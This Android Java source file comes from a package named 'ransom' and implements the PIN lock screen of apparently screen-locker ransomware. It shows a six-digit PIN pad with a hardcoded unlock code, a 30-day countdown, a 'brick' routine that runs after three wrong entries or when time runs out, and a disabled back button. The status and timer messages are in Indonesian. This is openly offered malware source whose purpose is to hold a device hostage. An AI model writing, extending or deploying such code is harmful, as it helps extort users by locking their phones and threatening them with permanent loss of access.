package com.omega.ransom;

import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.util.Timer;
import java.util.TimerTask;

public class PinActivity extends AppCompatActivity {

    private static final String CORRECT_PIN = "201192";
    private int attempts = 0;
    private StringBuilder pin = new StringBuilder();
    private TextView[] pinBoxes = new TextView[6];
    private TextView statusText, timerText;
    private Timer timer;
    private long lockTime = System.currentTimeMillis();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_pin);

        pinBoxes[0] = findViewById(R.id.pin1);
        pinBoxes[1] = findViewById(R.id.pin2);
        pinBoxes[2] = findViewById(R.id.pin3);
        pinBoxes[3] = findViewById(R.id.pin4);
        pinBoxes[4] = findViewById(R.id.pin5);
        pinBoxes[5] = findViewById(R.id.pin6);
        statusText = findViewById(R.id.status_text);
        timerText = findViewById(R.id.timer_text);

        startTimer();
        showPin();
    }

    private void startTimer() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                runOnUiThread(() -> {
                    long elapsed = System.currentTimeMillis() - lockTime;
                    long remaining = 30 * 24 * 60 * 60 * 1000L - elapsed;
                    if (remaining <= 0) {
                        timerText.setText("WAKTU HABIS!");
                        brick();
                        return;
                    }
                    long days = remaining / (24 * 60 * 60 * 1000);
                    long hours = (remaining % (24 * 60 * 60 * 1000)) / (60 * 60 * 1000);
                    long mins = (remaining % (60 * 60 * 1000)) / (60 * 1000);
                    long secs = (remaining % (60 * 1000)) / 1000;
                    timerText.setText(String.format("SISA WAKTU: %d HARI %02d:%02d:%02d", days, hours, mins, secs));
                });
            }
        }, 0, 1000);
    }

    private void showPin() {
        for (int i = 0; i < 6; i++) {
            if (i < pin.length()) {
                pinBoxes[i].setText("●");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_filled);
            } else {
                pinBoxes[i].setText("");
                pinBoxes[i].setBackgroundResource(R.drawable.pin_empty);
            }
        }
    }

    public void onDigitClick(View view) {
        if (pin.length() >= 6) return;
        pin.append(view.getTag().toString());
        showPin();
        if (pin.length() == 6) {
            checkPin();
        }
    }

    private void checkPin() {
        if (pin.toString().equals(CORRECT_PIN)) {
            timer.cancel();
            setResult(RESULT_OK);
            finish();
        } else {
            attempts++;
            statusText.setText("SALAH! " + (3 - attempts) + " KESEMPATAN TERSISA");
            if (attempts >= 3) {
                brick();
            } else {
                pin.setLength(0);
                showPin();
            }
        }
    }

    private void brick() {
        timer.cancel();
        setContentView(R.layout.activity_lock);
        findViewById(android.R.id.content).setBackgroundColor(0xFF000000);
        stopService(new android.content.Intent(this, LockService.class));
    }

    public void onDeleteClick(View view) {
        if (pin.length() > 0) {
            pin.deleteCharAt(pin.length() - 1);
            showPin();
        }
    }

    @Override
    public void onBackPressed() {
        // Disable back button
    }
}
